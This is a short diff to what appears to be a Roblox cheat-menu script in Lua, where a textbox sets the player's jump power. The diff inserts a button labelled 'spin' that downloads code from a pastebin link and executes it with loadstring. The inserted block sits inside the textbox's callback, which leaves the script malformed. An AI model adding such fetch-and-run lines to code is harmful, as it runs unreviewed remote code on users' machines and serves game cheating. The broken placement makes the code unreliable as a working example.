@@ -29,7 +29,15 @@ Tab:AddTextbox({
 	Default = "",
 	TextDisappear = true,
 	Callback = function(Value)
-		game.Players.LocalPlayer.Character.Humanoid.JumpPower = Value
+
+Tab:AddButton({
+  Name = "旋转",
+  Callback = function()
+    loadstring(game:HttpGet('https://pastebin.com/raw/r97d7dS0', true))()
+  end
+})
+
+game.Players.LocalPlayer.Character.Humanoid.JumpPower = Value
 	end
 })
 
